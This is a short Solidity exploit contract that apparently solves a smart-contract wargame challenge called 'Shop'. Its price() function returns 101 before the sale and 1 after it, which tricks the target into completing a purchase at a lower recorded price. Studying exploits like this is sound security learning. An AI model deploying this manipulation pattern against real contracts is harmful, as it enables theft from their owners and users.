// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Shop.sol';

contract Attacker {
    address target;
    uint count;

    constructor(address _target) public {
        target = _target;
    }

    function attack() public {
        Shop(target).buy();
    }

    function price() external view returns(uint){
        if(Shop(target).isSold()){
            return 1;
        }
        return 101;
    }
}